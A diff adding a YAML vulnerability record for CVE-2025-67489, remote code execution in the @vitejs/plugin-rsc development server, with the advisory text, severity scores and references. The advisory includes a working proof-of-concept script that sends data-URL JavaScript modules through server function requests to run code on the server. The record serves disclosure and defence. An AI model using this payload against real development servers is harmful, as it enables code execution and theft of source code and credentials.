@@ -1,0 +1,151 @@
+vulnerability_id: VCID-uddg-s3z4-afeq
+aliases:
+  - CVE-2025-67489
+  - GHSA-j76j-5p5g-9wfr
+summary: |
+  @vitejs/plugin-rsc Remote Code Execution through unsafe dynamic imports in RSC server function APIs on development server
+  ## Summary
+
+  Arbitrary Remote Code Execution on development server via unsafe dynamic imports in `@vitejs/plugin-rsc` server function APIs (`loadServerAction`, `decodeReply`, `decodeAction`) when integrated into RSC applications that expose server function endpoints.
+
+  ## Impact
+
+  Attackers with network access to the development server can execute arbitrary JavaScript code with Node.js privileges, allowing them to read/modify files, exfiltrate sensitive data (source code, environment variables, credentials), or pivot to other internal services. While this affects development servers only, the risk increases when using `vite --host` to expose the server on all network interfaces.
+
+
+  ## Details
+
+  In the example RSC application provided in Proof of Concept, the server handles server function call through API such as `loadServerAction`, `decodeReply`, `decodeAction` with http request's header and body as inputs:
+
+  https://github.com/vitejs/vite-plugin-react/blob/c8af971f57f12d0190d7fd8829a429f5e4112f60/packages/plugin-rsc/examples/starter/src/framework/entry.rsc.tsx#L42-L47
+
+  During development, these API internally relies on dynamic import to load server function module, which allows executing arbitrary module including data url module.
+
+  https://github.com/vitejs/vite-plugin-react/blob/c8af971f57f12d0190d7fd8829a429f5e4112f60/packages/plugin-rsc/src/rsc.tsx#L19-L24
+
+  ## Proof of Concept
+
+  The example app is avialable in
+  - https://github.com/vitejs/vite-plugin-react/tree/main/packages/plugin-rsc/examples/starter
+  - https://stackblitz.com/edit/github-rubfqp9k?file=poc.js
+
+  **Reproduction Steps:**
+
+  - Stat development server `vite dev`
+  - Run a following script `node poc.js`
+  - See "REMOTE CODE EXECUTION1" and "REMOTE CODE EXECUTION2"  in server console
+
+  ```js
+  // [poc.js]
+  const payload = {
+    0: ["$F1"],
+    1: { id: "data:text/javascript,console.log('REMOTE CODE EXECUTION 1')# " },
+  };
+  const fd = new FormData();
+  for (const key in payload) {
+    fd.append(key, JSON.stringify(payload[key]));
+  }
+
+  const serverUrl = process.argv[2] || 'http://localhost:5173/_.rsc';
+  const response = fetch(serverUrl, {
+    method: "POST",
+    headers: {
+      "x-rsc-action": "data:text/javascript,console.log('REMOTE CODE EXECUTION 2')# ",
+    },
+    body: fd,
+  })
+  ```
+severities:
+  - score: '0.00378'
+    scoring_system: epss
+    scoring_elements: '0.5881'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-67489
+  - score: '0.00412'
+    scoring_system: epss
+    scoring_elements: '0.60905'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-67489
+  - score: CRITICAL
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-j76j-5p5g-9wfr
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/commit/fe634b58210d0a4a146a7faae56cd71af3bb9af4
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/commit/fe634b58210d0a4a146a7faae56cd71af3bb9af4
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2025-12-10T16:00:10Z/
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/commit/fe634b58210d0a4a146a7faae56cd71af3bb9af4
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-j76j-5p5g-9wfr
+  - score: CRITICAL
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-j76j-5p5g-9wfr
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-j76j-5p5g-9wfr
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2025-12-10T16:00:10Z/
+    published_at: None
+    url: https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-j76j-5p5g-9wfr
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-67489
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-67489
+weaknesses:
+  - CWE-94
+  - CWE-1035
+  - CWE-937
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-67489
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite-plugin-react
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite-plugin-react/commit/fe634b58210d0a4a146a7faae56cd71af3bb9af4
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-j76j-5p5g-9wfr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-67489
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-j76j-5p5g-9wfr
+    reference_type:
+    reference_id: GHSA-j76j-5p5g-9wfr
